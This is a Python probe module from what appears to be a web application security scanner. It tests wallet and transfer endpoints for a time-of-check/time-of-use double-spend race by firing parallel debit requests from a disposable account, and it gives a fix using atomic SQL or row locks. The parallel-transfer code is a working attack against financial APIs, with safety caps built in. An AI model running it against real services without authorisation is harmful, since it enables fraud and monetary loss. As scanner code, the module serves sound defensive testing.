#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Business logic: race condition in financial transfer / wallet debit.

A wallet, gift-card, points, or balance-transfer endpoint that does
its balance check + debit in two non-atomic steps lets a parallel
attacker spend the same dollar twice. The classic shape is:

    balance = SELECT balance FROM wallets WHERE id = ?;
    if balance >= amount:
        UPDATE wallets SET balance = balance - amount WHERE id = ?;
        INSERT transfer ...

Without a row lock or compare-and-set, two requests that read the
same starting balance can both pass the check and both debit, ending
with negative balance or with the same funds delivered to two
recipients. The fix is `UPDATE wallets SET balance = balance - ?
WHERE id = ? AND balance >= ?` (or a row-level lock inside a
transaction).

This probe registers a fresh test account, learns the user's wallet /
balance endpoint, then fires N parallel POSTs to the transfer
endpoint with a small amount that the starting balance can cover
EXACTLY ONCE. With a correct atomic implementation, only one parallel
request succeeds and the rest fail with insufficient-funds. With a
TOCTOU bug, two or more requests succeed.

Detection signal:
  - Successful response count > 1 across N parallel requests AND
  - Final balance < (initial - amount)  (overspent)

Both signals required; we never validate from the success-count
alone, because some flows respond 200 even on rejected transfers.

Safe-payload notes:
  - N capped to manifest request_budget_max (40 / typical 30).
  - Transfer amount is small ($1, or 1 unit) so that even on a fast
    target the total over-spend is trivially refundable.
  - Probe always cleans up by attempting a single POST to mark the
    test account inactive if the API exposes such an endpoint;
    otherwise the disposable account is left for the operator to
    cull.
"""
from __future__ import annotations

import json
import secrets
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Common transfer / wallet endpoint candidates. We probe the first one
# that responds 200 to GET (for balance) and accepts our POST shape.
TRANSFER_PATHS = (
    "/api/wallet/transfer",
    "/api/wallet/withdraw",
    "/api/account/transfer",
    "/rest/wallet/transfer",
    "/rest/deluxe-membership",  # Juice-Shop wallet-debit shape
)
BALANCE_PATHS = (
    "/api/wallet",
    "/api/wallet/balance",
    "/rest/wallet/balance",
    "/api/Wallets",
)
DEFAULT_PARALLEL = 10  # conservative; manifest cap is 40


def _register_and_login(client: SafeClient, origin: str) -> dict:
    """Create a disposable account so the probe never mutates a real
    user's wallet. Returns the auth token and email; missing keys mean
    we couldn't establish a session and the probe should bail."""
    email = f"race-{secrets.token_hex(6)}@dast.test"
    pw = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
        except json.JSONDecodeError:
            pass
    return out


def _fetch_balance(client: SafeClient, origin: str, token: str) -> tuple[str, float | None]:
    """Try each balance path; return (path_used, balance) on first hit."""
    for path in BALANCE_PATHS:
        r = client.request("GET", urljoin(origin, path),
                           headers={"Authorization": f"Bearer {token}"})
        if r.status == 200 and r.body:
            try:
                doc = json.loads(r.text)
            except json.JSONDecodeError:
                continue
            # Accept both flat {balance: N} and wrapped {data: {balance: N}}.
            for candidate in (doc, doc.get("data") if isinstance(doc, dict) else None):
                if isinstance(candidate, dict):
                    for key in ("balance", "amount", "credit", "wallet"):
                        v = candidate.get(key)
                        if isinstance(v, (int, float)):
                            return path, float(v)
    return "", None


class BizLogicRaceConditionTransferProbe(Probe):
    name = "bizlogic_race_condition_transfer"
    summary = ("Detects TOCTOU race in wallet / balance-transfer "
               "endpoints — N parallel debits cause double-spend.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--parallel", type=int, default=DEFAULT_PARALLEL,
            help=("Number of parallel transfer POSTs. Capped by the "
                  "manifest request budget; default 10."))
        parser.add_argument(
            "--amount", type=int, default=1,
            help="Per-transfer amount; kept small for safety. Default 1.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=("Inconclusive: could not establish a probe "
                         f"session on {origin}; race-condition test skipped."),
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]

        balance_path, initial_balance = _fetch_balance(client, origin, token)
        if initial_balance is None:
            return Verdict(
                validated=False, confidence=0.7,
                summary=("Refuted: no wallet/balance endpoint found "
                         f"on {origin}; nothing to race against."),
                evidence={"origin": origin, "tried": list(BALANCE_PATHS)},
            )

        # Pick the first transfer path that returns 2xx/4xx (i.e. exists).
        # 404 from every candidate means there is nothing to test.
        target_path = ""
        for path in TRANSFER_PATHS:
            probe_body = json.dumps({"amount": 0,
                                     "to": "noop@dast.test"}).encode()
            r = client.request("POST", urljoin(origin, path),
                               headers={"Authorization": f"Bearer {token}",
                                        "Content-Type": "application/json"},
                               body=probe_body)
            if r.status != 404:
                target_path = path
                break
        if not target_path:
            return Verdict(
                validated=False, confidence=0.8,
                summary=("Refuted: no transfer/withdraw endpoint "
                         f"found on {origin} (all candidates 404)."),
                evidence={"origin": origin,
                          "tried": list(TRANSFER_PATHS)},
            )

        # Cap parallelism to remaining request budget so we never trip
        # SafetyViolation mid-burst. We need 1 final-balance GET reserved.
        remaining = max(1, client.budget.max_requests - client.budget.used - 1)
        n = max(2, min(int(args.parallel), remaining))
        amount = max(1, int(args.amount))

        url = urljoin(origin, target_path)
        payload = json.dumps({"amount": amount,
                              "to": f"sink-{secrets.token_hex(4)}@dast.test"}).encode()
        headers = {"Authorization": f"Bearer {token}",
                   "Content-Type": "application/json"}

        # Fire N concurrent POSTs. We use a small ThreadPoolExecutor;
        # SafeClient uses urllib (no shared connection-pool mutex), so
        # parallel access is safe. Budget is consumed pre-send so the
        # cap is respected even under contention.
        successes: list[int] = []
        results: list[dict] = []

        def _fire(_i: int) -> dict:
            r = client.request("POST", url, headers=headers, body=payload)
            return {"status": r.status, "size": r.size,
                    "body_excerpt": (r.text or "")[:120]}

        with ThreadPoolExecutor(max_workers=min(n, 16)) as ex:
            futures = [ex.submit(_fire, i) for i in range(n)]
            for f in as_completed(futures):
                try:
                    res = f.result()
                except Exception as e:                                  # noqa: BLE001
                    res = {"status": 0, "error": str(e)[:120]}
                results.append(res)
                if 200 <= res.get("status", 0) < 300:
                    successes.append(res["status"])

        # Re-read the balance once to corroborate. A "successful race"
        # must show:
        #   - more than one HTTP success, AND
        #   - final balance < (initial - amount)  i.e. overspent past
        #     the point where a single debit would have left us.
        _, final_balance = _fetch_balance(client, origin, token)

        attempt = {
            "transfer_path": target_path,
            "balance_path": balance_path,
            "parallel_requested": n,
            "successes": len(successes),
            "amount_per_request": amount,
            "initial_balance": initial_balance,
            "final_balance": final_balance,
            "status_distribution": sorted(
                {r.get("status") for r in results}, key=lambda x: (x or -1)),
        }
        evidence = {"origin": origin, "session_email": sess.get("email"),
                    "attempt": attempt, "samples": results[:5]}

        overspent = (
            final_balance is not None
            and initial_balance is not None
            and final_balance < (initial_balance - amount - 0.01)
        )
        if len(successes) > 1 and overspent:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(f"Confirmed: race condition on "
                         f"{origin}{target_path}. {len(successes)} of "
                         f"{n} parallel transfers of {amount} succeeded; "
                         f"balance moved from {initial_balance} to "
                         f"{final_balance} (more than one debit "
                         "cleared)."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Make the balance debit atomic. Either:\n"
                    "  - SELECT ... FOR UPDATE inside a serializable "
                    "transaction, or\n"
                    "  - UPDATE wallet SET balance = balance - :amt "
                    "WHERE id = :id AND balance >= :amt RETURNING * "
                    "(reject if zero rows affected).\n"
                    "Application-layer if-balance-then-debit checks "
                    "are insufficient under concurrency."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: parallel transfers on "
                     f"{origin}{target_path} did not produce double-"
                     f"spend ({len(successes)} successes, balance "
                     f"{initial_balance}->{final_balance})."),
            evidence=evidence,
        )


if __name__ == "__main__":
    BizLogicRaceConditionTransferProbe().main()
